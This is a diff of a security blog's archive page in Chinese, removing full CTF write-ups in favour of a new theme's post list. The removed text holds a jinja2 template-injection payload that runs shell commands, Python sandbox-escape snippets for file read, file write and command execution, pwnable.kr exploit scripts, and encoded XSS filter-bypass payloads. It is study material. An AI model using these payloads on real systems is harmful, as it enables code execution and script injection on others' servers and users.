@@ -1,1371 +1,421 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  
-  <title>Page 5 | damn1t | faint star</title>
-
-  
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
   <meta name="author" content="damn1t">
-  
-
-  
-  <meta name="description" content="404">
-  
-
-  
-
-  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-
-  
-
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="damn1t"/>
+  <meta property="og:description" content="404" />
   <meta property="og:site_name" content="damn1t"/>
-
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="http://microvorld.com"/>
   
-  <meta property="og:image" content="/favicon.ico"/>
+    <link rel="alternate" href="/atom.xml" title="damn1t" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
   
 
-  <link href="/favicon.ico" rel="icon">
-  <link rel="alternate" href="/atom.xml" title="damn1t" type="application/atom+xml">
-  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!-- Site Title -->
+  <title>damn1t</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
 </head>
 
+  <body>
+    <!-- Page Header -->
 
-<body>
-<div class="blog">
-  <div class="content">
 
-    <header>
-  <div class="site-branding">
-    <h1 class="site-title">
-      <a href="/">damn1t</a>
-    </h1>
-    <p class="site-description">faint star</p>
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">damn1t</p>
+          <p class="subtitle">faint star</p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/microvorld">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<bubbl3@foxmail.com>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
   </div>
-  <nav class="site-navigation">
-    <ul>
-      
-        <li><a href="/">Home</a></li>
-      
-        <li><a href="/archives">Archives</a></li>
-      
-    </ul>
-  </nav>
 </header>
 
-    <main class="site-main posts-loop">
-    
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/09/11/vulnerable/jinja2/"><span>由Musee de X(强网杯2017)到jinja2模板注入</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/09/11/vulnerable/jinja2/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-09-11T07:03:37.788Z">
-          2018-09-11
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
+<!-- Home Page Post List -->
+<div class="container">
+  <div class="row">
+    <div class="col-lg-10 col-md-10 col-md-offset-1">
       
-        <h1 id="Musee-de-X-强网杯2017"><a href="#Musee-de-X-强网杯2017" class="headerlink" title="Musee de X(强网杯2017)"></a>Musee de X(强网杯2017)</h1><p><strong>学到新姿势</strong></p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注册admin之后进行登录，然后有一个捐赠页面，，网址随便填，这里有一点要注意，名字必须和登录名一致，否则会弹出：<strong>screw you hacker</strong></p>
-<p>然后就成功的报错,查看报错信息:<br>在<strong>/var/www/html/museum/view.py in makememe</strong>中有以下错误：</p>
-<pre><code>if &quot;http://&quot; in url:
-image = urllib2.urlopen(url)
-  else:
-    url = &quot;http://&quot;+url
-image = urllib2.urlopen(url)
-except:
-  return HttpResponse(&quot;Error: couldn&apos;t get to that URL: &quot; + url + BACK)
-if int(image.headers[&quot;Content-Length&quot;]) &gt; 1024*1024: ...
-  return HttpResponse(&quot;File too large&quot;)
-fn = get_next_file(username)
-open(fn,&quot;w&quot;).write(image.read())
-text = jinja2.Template(text).render()
-print text
-add_text(fn,imghdr.what(fn),text)
-</code></pre><p>可知用用了jinja2模板<br>而在<strong>local vars</strong>中<strong>text</strong>行：</p>
-<blockquote>
-<p>text：u’admin’</p>
-</blockquote>
-<p>可以知道将用户名当作文本信息发送，那么这里就存在注入点</p>
-<h2 id="关于模板注入"><a href="#关于模板注入" class="headerlink" title="关于模板注入"></a>关于模板注入</h2><p>重点要关注的是Template，官方教程给出如下说明：</p>
-<pre><code>`{% ... %}` for Statements
-`{{ ... }}` for Expressions to print to the template output
-`` for Comments not included in the template output
-`#  ... ##` for Line Statements
-</code></pre><p>jinja2模板能访问一些python内置变量，如[],{}等，并且能够使用Python变量类型中的一些函数，这里要说明的一点是，如果要在jinja2中执行python代码，则要在模板环境中注册函数才能在模板中进行调用，具体可参考这篇文章：<br><a href="http://www.freebuf.com/articles/system/97146.html" target="_blank" rel="noopener">利用 Python 特性在 Jinja2 模板中执行任意代码</a></p>
-<p>于是给出payload：</p>
-<pre><code>abc{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
-</code></pre><p>要说明的一点是因为网址信息要求是一张图片，所以需要给出图片地址，例：<a href="http://pic.58pic.com/58pic/17/28/21/24d58PICqnU_1024.jpg" target="_blank" rel="noopener">http://pic.58pic.com/58pic/17/28/21/24d58PICqnU_1024.jpg</a></p>
-<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="builtins模块"><a href="#builtins模块" class="headerlink" title="builtins模块"></a><strong>builtins</strong>模块</h3><p>builtins模块是python中的一个内建模块，如图：<br><img src="https://i.imgur.com/HoztRez.png" alt=""><br>该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存。另外，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀。<strong>但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即dict字典属性)中添加该功能。</strong></p>
-<h3 id="class-base-subclasses"><a href="#class-base-subclasses" class="headerlink" title="().class.base.subclasses()"></a>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()</h3><p><img src="https://i.imgur.com/4D9ci7V.png" alt=""><br>为什么可以访问到所有模块呢？<br>当我们输入<code>().__class__</code>时，python显示为一个<strong>tuple</strong>类型，于是继续输入<code>().__class__.__base__</code>,访问类库，python显示为<strong>object</strong>类型，我们再继续访问，输入<code>().__class__.__base__.__subclasses__()</code>便得到了object的所有子类。于是接下来我们就可以访问对应的子类，由此便可能引发安全问题，例如<strong>file</strong>可以读取任意文件<br>除此之外还要提到的是，输入<code>().__class__.__mro__[1].__subclasses__()</code>也可以访问object的所有子类，这里要注意的是mro(Method Resolution Order)，关于多继承的问题，不再赘述</p>
-<p>示例利用代码：</p>
-<pre><code>//读文件
-().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read() 
-//写文件
-().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;) 
-//执行任意命令
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )
-</code></pre><p>制作沙盒环境时，可能往往会删掉一些危险函数</p>
-<pre><code>del __builtins__.__dict__[&apos;__import__&apos;] # __import__ is the function called by the import statement
-del __builtins__.__dict__[&apos;eval&apos;] # evaluating code could be dangerous
-del __builtins__.__dict__[&apos;execfile&apos;] # likewise for executing the contents of a file
-del __builtins__.__dict__[&apos;input&apos;] # Getting user input and evaluating it might be dangerous
-</code></pre><p>然而我们可以通过reload方法进行重载<br> <code>reload(__builtins__)</code></p>
-<p>还有一些情况是，程序员会进行一些关键词过滤，于是有几种思路是：</p>
-<ol>
-<li>利用python的base64等模块进行加密操作，然后再代码利用再进行一次解密操作<blockquote>
-<pre><code>&gt;&gt;import base64
-&gt;&gt;base64.b64encode(&apos;__import__&apos;)
-&apos;X19pbXBvcnRfXw==&apos;
-&gt;&gt;base64.b64encode(&apos;os&apos;)
-&apos;b3M=&apos; 
-</code></pre></blockquote>
-</li>
-<li>拼接字符串:</li>
-</ol>
-<pre><code>[x for x in [].class.base.subclasses() if x.name == &apos;catch_warnings&apos;][0].init.func_globals[&apos;linecache&apos;].dict[&apos;o&apos;+&apos;s&apos;].dict[&apos;sy&apos;+&apos;stem&apos;](&apos;echo Hello SandBox&apos;)
-</code></pre>
-      
+        <div class="post-item-wrapper">
+  <a href="/2018/09/11/vulnerable/jinja2/" class="post-title">
+      由Musee de X(强网杯2017)到jinja2模板注入
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-09-11</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
     </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/CTF/">CTF</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/09/08/pwn/pwnable1/"><span>pwnable.kr(1-2)</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/09/08/pwn/pwnable1/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-09-08T08:43:57.645Z">
-          2018-09-08
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
       
-        <h1 id="pwnable-kr-1-2"><a href="#pwnable-kr-1-2" class="headerlink" title="pwnable.kr(1-2)"></a>pwnable.kr(1-2)</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>第一题ssh连接之后给出如下代码：</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-char buf[32];
-int main(int argc, char* argv[], char* envp[]){
-//argc是命令行参数个数(必为int类型)，char*argv[]是指所有命令行参数，char *envp[]是环境变量
-//argv参数是字符串指针数组，其各元素值为命令行中各字符串的首地址，指针数组的长度即为参数个数
+        
 
-    if(argc&lt;2){
-        printf(&quot;pass argv[1] a number\n&quot;);
-        return 0;
-    }
-    int fd = atoi( argv[1] ) - 0x1234;
-    //atoi函数将字符串转化成整形
-    //fd文件描述符，只是一个整数
-    int len = 0;
-    len = read(fd, buf, 32);
-    /*read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。
-    返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动*/
-    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
-        printf(&quot;good job :)\n&quot;);
-        system(&quot;/bin/cat flag&quot;);
-        exit(0);
-    }
-    printf(&quot;learn about Linux file IO\n&quot;);
-    return 0;
+<a class="tag" href="/tags/CTF/">CTF</a>
 
-}
-</code></pre><p>这题的重点在题目中也提示了-&gt;<strong>fd</strong><br>通过查阅资料了解到fd就是File descripter也就是文件描述符，维基上有如下解释：In Unix and related computer operating systems, a file descriptor (FD, less frequently fildes) is an abstract indicator (handle) used to access a file or other input/output resource, such as a pipe or network socket.<br>所以<strong>fd</strong>是在UNIX及其相关联系统上才有的，<strong>fd</strong>为一个非负整数，他的0，1，2代表了不同的含义<br><img src="https://i.imgur.com/dnzdPFz.png" alt=""></p>
-<p>回到原题，关键要满足：<code>buf=LETMEWIN</code>，所以要输入<strong>LETMEWIN</strong>就要使<code>int fd = atoi( argv[1] ) - 0x1234;</code>中的fd为0，因为0x1234=4660(int)，因此在终端输入<strong>./fd 4660</strong>然后再写入<strong>LETMEWIN</strong>即可<br>再给出一个exp：</p>
-<pre><code>from pwn import *
-pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;fd&apos;,password=&apos;guest&apos;,port=2222)
-print (pwn_ssh.connected())
-sh=pwn_ssh.process(argv=[&apos;fd&apos;,&apos;4660&apos;],executable=&apos;./fd&apos;)
-sh.sendline(&quot;LETMEWIN&quot;)
-print (sh.recvall())
-</code></pre><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>老规矩查看代码：</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-unsigned long hashcode = 0x21DD09EC;
-unsigned long check_password(const char* p){
-    int* ip = (int*)p;
-    int i;
-    int res=0;
-    for(i=0; i&lt;5; i++){
-        res += ip[i];
-    }
-    return res;
-}
-
-int main(int argc, char* argv[]){
-/*前者可接受 命令行参数，argc表示参数个数， argv[]是参数数组,其中第0个参数是程序本身的名称（包含路径）。
-argv[]是一个字符数组.
-argv[0]:指向程序的全路径名
-argv[1]:指向在DOS命令行中执行程序名后的第一个字符串。
-argv[2]:指向第二个字符串。
-*/
-
-    if(argc&lt;2){
-        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
-        return 0;
-    }
-    if(strlen(argv[1]) != 20){
-        printf(&quot;passcode length should be 20 bytes\n&quot;);
-        return 0;
-    }
-
-//
-//参数至少两个，hashcode=input
-    if(hashcode == check_password( argv[1] )){
-        system(&quot;/bin/cat flag&quot;);
-        return 0;
-    }
-    else
-        printf(&quot;wrong passcode.\n&quot;);
-    return 0;
-}
-</code></pre><p>思路很明显：输入参数20个字节，最后res的值在5次循环相加之后要满足等于0x21DD09EC，还要说明的一点是int占4个字节，char占1个字节，因此<code>int* ip = (int*)p;</code>这里就将passcode分成了有5个参数的数组，所以随便输入一个<code>hex(0x21DD09EC-0x01020304*4)</code>得到0x1dd4fddc，于是在终端输入<br> <code>./col $(python -c &#39;print &quot;\xdc\xfd\xd4\x1d&quot;+4*&quot;\x04\x03\x02\x01&quot;&#39;)</code><br>最终得到答案<br>有一点要说的是<strong>python -c</strong>，python给出的解释是：</p>
-<blockquote>
-<p>-c cmd : program passed in as string (terminates option list)</p>
-</blockquote>
-<p>给出exp：</p>
-<pre><code>from pwn import *
-import os
-
-pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;col&apos;,password=&apos;guest&apos;,port=2222)
-print (pwn_ssh.connected())
-
-sh=pwn_ssh.process(argv=[&apos;collision&apos;,&apos;\xfc\x01\xf9\x39&apos; * 5],executable=&apos;./col&apos;)
-print (sh.recvall())
-</code></pre>
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/pwn/">pwn</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/07/19/web/编码与解码/"><span>关于编码与解码的思考</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/07/19/web/编码与解码/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-07-18T17:32:30.996Z">
-          2018-07-19
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h1 id="关于编码与解码的思考"><a href="#关于编码与解码的思考" class="headerlink" title="关于编码与解码的思考"></a>关于编码与解码的思考</h1><p>最近做了SCTF，看了官方wp，其中看到了在进行xss测试的使用了</p>
-<pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} }
-    };\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029//');}}
-</code></pre><p>这时不禁想到了一个问题，为什么要进行js编码？什么时候才应该进行编码绕过？浏览器与服务器之间是如何处理编码与解码的？</p>
-<h2 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h2><p><strong><a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">URL编码</a></strong>：一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)<br><strong><a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">HTML实体编码</a></strong>：<br><strong>命名实体</strong>：以&amp;开头，分号结尾的，例如“<code>&lt;</code>”的编码是”<code>&amp;lt;</code>“<br><strong>字符编码</strong>：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“<code>&amp;#060;</code>”和“<code>&amp;#x3c;</code>”<br><strong>JS编码</strong>：js提供了四种字符编码的策略</p>
-<pre><code>1、三个八进制数字，如果不够个数，前面补0，例如&quot;e&quot;编码为&quot;\145&quot;
-2、两个十六进制数字，如果不够个数，前面补0，例如&quot;e&quot;编码为&quot;\x65&quot;
-3、四个十六进制数字，如果不够个数，前面补0，例如&quot;e&quot;编码为&quot;\u0065&quot;
-4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
-</code></pre><p><strong>CSS编码</strong>：用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为”\65”或”65”或”00065”<br><strong>复合编码</strong>：<br>所谓复合编码，也就是说输出的内容输出在多个环境中，例如</p>
-<pre><code>&lt;td onclick=&quot;openUrl(add.do?userName=&apos;&lt;%=value%&gt;&apos;);&quot;&gt;11&lt;/td&gt;
-</code></pre><p>value的内容首先出现在一个URL中，这个URL在一段javascript总，而javascript代码又是html的一部分。所以解码的顺序就是HTML解码–&gt;js解码–&gt;url解码，那么正确的编码顺序就应该是url编码–&gt;js编码–&gt;html编码。<br>下面的代码参考了文章：<a href="http://www.freebuf.com/articles/web/43285.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/43285.html</a></p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>核心代码：</p>
-<pre><code>&lt;?php
-
-function htmlencode($str){
-   if(empty($str)) return;
-   if($str == &quot;&quot;) return;
-
-   $str = str_ireplace(&quot;&lt;&quot;,&quot;&quot;,$str);
-   $str = str_ireplace(&quot;&gt;&quot;,&quot;&quot;,$str);
-   $str = str_ireplace(&quot;script&quot;,&quot;&quot;,$str);
-   $str = str_ireplace(&quot;img&quot;,&quot;&quot;,$str);
-   $str = str_ireplace(&quot;:&quot;,&quot;&quot;,$str);
-   $str = str_ireplace(&quot;javascript&quot;,&quot;&quot;,$str);
-
-   return $str;
-}
-
-if(!array_key_exists (&quot;name&quot;,$_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;){
-
- $isempty = true;
-
-} else {
-
- $html .= &apos;&lt;pre&gt;&apos;;
- $html .= &apos;&lt;a onclick=&quot;&apos;.htmlencode($_GET[&apos;name&apos;]).&apos;&quot;&gt;click this url&lt;/a&gt;&apos;;
- $html .= &apos;&lt;/pre&gt;&apos;;
-
-}
-echo $html;
-?&gt;
-</code></pre><p>对用户输入进行了过滤操作，过滤了：&lt;，&gt;，script，等，这里还要提一下<code>&lt;pre&gt;</code>标签:</p>
-<blockquote>
-<p>pre 元素可定义预格式化的文本。被包围在 pre 元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。</p>
-</blockquote>
-<p>也就是说，原封不动应用原格式而不会进行html的预处理更改<br>然后考虑如何注入xss，$name存在于两层环境中，先在html中，然后在js中，所以解码的顺序是html-&gt;js,因此可以构造<code>javascript:alert(/xss/)</code>，然后这里可以对整个语句进行html编码：</p>
-<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;
-</code></pre><p>或者局部编码：</p>
-<pre><code>java&amp;#115;cript&amp;#58;alert(/xss/)
-</code></pre><p>都可以得到结果：<br><img src="https://i.imgur.com/bvG7IU9.png" alt=""></p>
-<h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>主要代码：</p>
-<pre><code>&lt;?php
-
-if(!array_key_exists (&quot;name&quot;,$_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;){
-
-   $isempty = true;
-
-} else {
-   $value = $_GET[&apos;name&apos;];
-   $html .= &apos;&lt;pre&gt;&apos;;
-   $html .= &quot;Your Name is :
-   &lt;div id=&apos;a&apos;&gt;&lt;/div&gt;
-   &lt;script&gt;
-   document.getElementById(&apos;a&apos;).innerHTML= &quot;.&quot;&apos;&quot;.htmlspecialchars($value).&quot;&apos;&quot;.&quot;;
-   &lt;/script&gt;
- &quot;;
-   $html .= &apos;&lt;/pre&gt;&apos;;
-
-}
-
-echo $html;
-?&gt;
-</code></pre><p>当我们输入<code>&lt;img src=1 onerror=alert(1)&gt;</code>时，可以发现源代码已将其处理为<br><img src="https://i.imgur.com/wuu389H.png" alt=""><br>因为<code>htmlspecialchars</code>对特殊字符进行了处理，会将”&lt;”，”&gt;”，”&amp;”，” ‘ “，” “ “处理为实体，所以再分析$value所处的环境，因为处在<code>&lt;scritpt&gt;</code>中，所以先是js环境，然后是html环境，所以可以对其进行js编码：</p>
-<pre><code>\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x31\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
-</code></pre><p>得到弹窗<br><img src="https://i.imgur.com/ZDAZnS2.png" alt=""></p>
-<h2 id="如何理解编码与解码过程"><a href="#如何理解编码与解码过程" class="headerlink" title="如何理解编码与解码过程"></a>如何理解编码与解码过程</h2><p>其实我当时看了还是有点绕，最后查了下资料，大致总结下：</p>
-<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>首先要理解的是DOM这个东西，<strong>文档对象模型</strong>，DOM是现目前而言处理html和xml的常用方法，给个图：<br><img src="https://i.imgur.com/7vSjUUg.jpg" alt=""><br>当处理html文档的时候，他就会将其肢解为一个个的分支树，然后解析</p>
-<h3 id="浏览器基本工作流程"><a href="#浏览器基本工作流程" class="headerlink" title="浏览器基本工作流程"></a>浏览器基本工作流程</h3><h4 id="浏览器的构成"><a href="#浏览器的构成" class="headerlink" title="浏览器的构成"></a>浏览器的构成</h4><ul>
-<li>用户界面－ 包括地址栏、后退/前进按钮、书签目录等，也就是你所看到的除了用来显示你所请求页面的主窗口之外的其他部分</li>
-</ul>
-<ul>
-<li>浏览器引擎－ 用来查询及操作渲染引擎的接口</li>
-</ul>
-<ul>
-<li>渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来</li>
-</ul>
-<ul>
-<li>网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作</li>
-</ul>
-<ul>
-<li>UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口</li>
-</ul>
-<ul>
-<li>JS解释器－ 用来解释执行JS代码</li>
-</ul>
-<ul>
-<li>数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术</li>
-</ul>
-<p><img src="https://i.imgur.com/sAUHYh0.jpg" alt=""></p>
-<h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p><img src="https://i.imgur.com/t23zz6c.jpg" alt=""></p>
-<h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><blockquote>
-<ol>
-<li><p>当浏览器发送http请求时，会先对特殊字符进行URL编码后，发送给服务器。</p>
-</li>
-<li><p>服务器收到客户端发送来的http请求，会对其进行URL解码后，再进行处理，处理完成后将结果返回给浏览器。</p>
-</li>
-<li>浏览器接收到html文件后，最先是触发html解析器来解析html，将标签转化为内容树中的DOM节点，此时在识别标签的时候，html解析器是不能识别哪些被html实体编码了，只有当整个DOM树建立起来后，才能对每个节点的内容进行识别，如果有html实体编码，再对其进行解码。</li>
-<li>在html解析器过程中，遇到js标签诸如<code>&lt;script&gt;</code>会调用js解释器对js代码进行解析，而js DOM API会对DOM结构进行更改，DOM树节点的更改也会反过来触发html解释器。</li>
-<li>CSS解释器也会在html解释器过程中参与进来，但它不会干扰到DOM树，它会结合<code>&lt;style&gt;</code>标签和CSS文件以及html指令来构建render tree。</li>
-</ol>
-</blockquote>
-<p>概括言之：<br><strong>URL解析-&gt;HTML解析-&gt;css渲染-&gt;js解析</strong><br>DOM树有特定语法规则，识别特定标签，这意味着，如果标签被破坏，DOM则会置之不理<br>回顾之前两个例子：</p>
-<ul>
-<li>第一个场景中，js语句是在a标签中，在onclick事件触发js解释器之前，DOM树结构已经建立完成了，并且这里也没有DOM API操作，所以浏览器会先对该语句进行html解码，然后再是js解码，所以当我们对payload进行html编码后，在js解释器解析该js语句时，其已经被html解码了，是正常的js语句，所以能够正常弹窗。</li>
-</ul>
-<ul>
-<li>场景二中，payload是在script标签里面，浏览器解析到这里时，会触发js解释器，js解释器会对该语句进行js解码操作，我们使用js编码的payload被还原成正常的语句。虽然此时整个DOM树已经建立起来了，但是由于DOM API存在，会再一次的调用html解释器，对我们的payload进行解析，payload里面有js标签，再一次触发js解释器，完成对js语句调用，成功弹窗。</li>
-</ul>
-<p>参考链接：<br><a href="http://www.mamicode.com/info-detail-1712225.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1712225.html</a><br><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/" target="_blank" rel="noopener">http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</a></p>
 
       
     </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/web/">web</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/05/29/web/序列化/"><span>php反序列化漏洞</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/05/29/web/序列化/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-05-29T10:50:46.015Z">
-          2018-05-29
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><h2 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h2><p>在php中存在两个函数，<strong>serialize</strong>和<strong>unserialize</strong>,他们的作用分别是将<strong>对象</strong>进行<strong>序列化</strong>和<strong>反序列化</strong></p>
-<h3 id="什么是序列化？"><a href="#什么是序列化？" class="headerlink" title="什么是序列化？"></a>什么是序列化？</h3><p>官方文档给出如下定义：</p>
-<blockquote>
-<p>serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</p>
-</blockquote>
-<p>简而言之，他将一个对象返回为字符串的形式<br>unserialize则将其还原</p>
-<h3 id="为什么要进行序列化？"><a href="#为什么要进行序列化？" class="headerlink" title="为什么要进行序列化？"></a>为什么要进行序列化？</h3><blockquote>
-<p>概念：对象是在内存中存储的数据类型，寿命通常随着生成该对象的程序的终止而终止，但是有些情况下需要将对象的状态保存下来，然后在需要使用的时候将对象恢复，对象状态的保存操作就是对象序列化的过程。对象序列化就是将对象转化为2进制字符串进行保存。 </p>
-<p>作用：将对象的状态通过数值和字符记录下来，以某种存储形式使自定义对象持久化，方便需要时候将对象进行恢复使用，用于对象的传递以及使程序代码更具维护性</p>
-</blockquote>
-<p>再换一种方式来理解</p>
-<blockquote>
-<p>“你有一个应用程序，需要传一些数据给其它应用程序，但数据保存在你的进程的堆栈中，其它进程无法访问你的应用程序进程的堆栈，要想把你的程序的数据给其它程序使用，必须将数据以某种形式传给其它进程，这个‘某种形式’就是序列化 。”</p>
-</blockquote>
-<p>也就是说，序列化给了你一种方式去方便你利用数据，而不是每一次运行程序时都要将目标程序重新运行一次</p>
-<h2 id="序列化的格式"><a href="#序列化的格式" class="headerlink" title="序列化的格式"></a>序列化的格式</h2><ol>
-<li>基础格式</li>
-</ol>
-<ul>
-<li>boolean<blockquote>
-<pre><code>b:;
-b:1; // True
-b:0; // False 
-</code></pre></blockquote>
-</li>
-<li>integer<blockquote>
-<pre><code>i:;
-i:1; // 1
-i:-3; // -3
